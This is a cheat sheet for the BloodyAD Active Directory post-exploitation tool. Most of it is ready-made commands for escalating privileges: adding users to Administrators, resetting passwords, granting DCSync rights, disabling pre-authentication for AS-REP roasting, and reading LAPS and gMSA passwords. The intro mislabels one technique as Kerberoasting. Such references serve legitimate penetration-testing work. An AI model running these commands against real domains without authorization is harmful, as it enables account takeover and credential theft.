**BloodyAD** is a post-exploitation tool designed to manipulate Active Directory permissions and perform privilege escalation by abusing ACLs (Access Control Lists). It allows attackers to interact with the domain via LDAP and modify key attributes in user, group, or domain objects.

The tool supports:

- `GenericAll`
- `GenericWrite`
- `WriteDACL`
- `WriteOwner`
- `AddSelf`
- `AllExtendedRights` (e.g., reset password)
- `PreAuthNotRequired` abuse (Kerberoasting)


---

## Installation

```bash
sudo apt install bloodyad
```


---

## Basic Syntax

```bash
python bloodyAD.py --host <DC_IP> -u <user> -p <password> -d <domain> [command] [options]
```

If using NTLM hash:

```bash
-H <LM:NTLM>
```


---

## Abuse Scenarios

### Add User to a Group

Used when attacker has **GenericAll**, **GenericWrite**, or **AddSelf** on a group.

```bash
bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH add groupMember 'Administrators' test
```

---

### Reset Another User’s Password

Requires **ForceChangePassword** or **GenericAll**.

```bash
bloodyAD --host 172.16.1.15 -d bloody.local -u jane.doe -p :NTLMHASH set password targetuser NewPass123!
```

---

### Abuse WriteDACL

Allows editing ACLs to grant yourself **GenericAll**.

```bash
bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH add genericAll <modified_object> <principal_receiving_the_right>
```

---

### Abuse WriteOwner

Take ownership of an object, then modify its ACL.

```bash
bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH set object victim_user owner -v attacker
```

---

### Set PreAuthNotRequired (AS-REP Roasting)

Disable Kerberos pre-auth to enable AS-REP roasting.

```bash
bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 add uac john.doe DONT_REQ_PREAUTH
```

---

### Enable/Disable Accounts

```bash
# Disable ACCOUNTDISABLE flag
bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 remove uac john.doe ACCOUNTDISABLE
```

---

### DCSync Rights

Grant DCSync to an account.

```bash
bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH add dcsync administrator
```

---

### DNS Record Manipulation

```bash
# Add DNS entry
bloodyAD -u stan.dard -p Password123! -d bloody.local --host 192.168.10.2 add dnsRecord my_machine_name 192.168.10.48

# Remove DNS entry
bloodyAD -u stan.dard -p Password123! -d bloody.local --host 192.168.10.2 remove dnsRecord my_machine_name 192.168.10.48
```

---

### Read Sensitive Attributes

```bash
# GMSA password
bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'gmsaAccount$' --attr msDS-ManagedPassword

# LAPS password
bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'COMPUTER$' --attr ms-Mcs-AdmPwd
```

---

### Policy & Enumeration

```bash
# Machine quota
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object 'DC=bloody,DC=local' --attr ms-DS-MachineAccountQuota

# Minimum password length
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object 'DC=bloody,DC=local' --attr minPwdLength

# AD functional level
bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 get object 'DC=bloody,DC=local' --attr msDS-Behavior-Version
```

---

### Enumeration Examples

```bash
# Get group members
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object Users --attr member

# Get all users
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get children 'DC=bloody,DC=local' --type user

# Get all computers
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get children 'DC=bloody,DC=local' --type computer

# Get all containers
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get children 'DC=bloody,DC=local' --type container
```

---

## Summary of Rights

|Right|Description|Enables|
|---|---|---|
|**GenericAll**|Full control of object|Reset passwords, modify groups, change DACLs|
|**GenericWrite**|Write to attributes|Set SPNs, change passwords, add PreAuthNotRequired|
|**WriteDACL**|Modify ACL|Grant privileges to attacker|
|**WriteOwner**|Change ownership|Take control and later modify ACL|
|**AddSelf**|Add self to group|Escalate to privileged group|
|**ForceChangePassword**|Reset password w/o old one|Immediate account access|
|**PreAuthNotRequired**|Disable Kerberos pre-auth|AS-REP roasting|
